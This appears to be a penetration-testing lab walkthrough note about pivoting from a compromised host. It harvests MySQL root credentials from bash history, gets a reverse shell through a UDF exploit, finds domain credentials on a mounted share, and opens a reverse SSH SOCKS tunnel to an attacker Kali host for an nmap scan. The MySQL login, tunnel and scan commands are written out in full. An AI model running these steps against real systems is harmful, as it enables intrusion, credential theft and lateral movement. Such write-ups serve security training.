1. MySQL root and password was retrieved from `~/.bash_history` root from Ajla
2. Use mysql root credentials to connect to mysql server
   
``` 
mysql -u root -pBmDu9xUHKe3fZi3Z7RdMBeb --host=127.0.0.1 --port=13306
```
   
3. Use User Defined Functions ([[udf]]) exploit to establish a reverse shell
> [!info] 
> Using our reverse shell, we checked on [[mounted-shares]] using `cat /etc/fstab`, and we found out that a share is mounted from the `10.5.5.20` host.
> 
>  Also, a powershell script [[system_report.ps1]] was found inside `/mnt/Scripts` containing credentials of a domain user named `alex`
   
4. Generate key-pair and add public key to Kali
5. Set up a dynamic port forward (SOCKS) from Zora to Kali using port 1080
   
```
ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@KALI_IP
```

> [!info] 
> `kali@kali:~$ proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20`  shows that port 3389 (RDP) is open.

